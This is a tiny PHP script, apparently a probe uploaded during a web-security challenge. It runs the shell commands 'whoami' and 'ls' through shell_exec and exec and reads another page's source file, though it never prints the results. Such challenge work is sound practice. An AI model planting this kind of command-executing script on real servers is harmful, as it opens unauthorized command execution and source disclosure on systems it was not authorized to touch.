<?PHP 
echo "Hello";
echo "start get content";
// file_get_contents('/web-serveur/ch13/index.php');
shell_exec('whoami');
exec('ls');
file_get_contents('/web-serveur/ch13/index.php');
echo "end get content";
?>
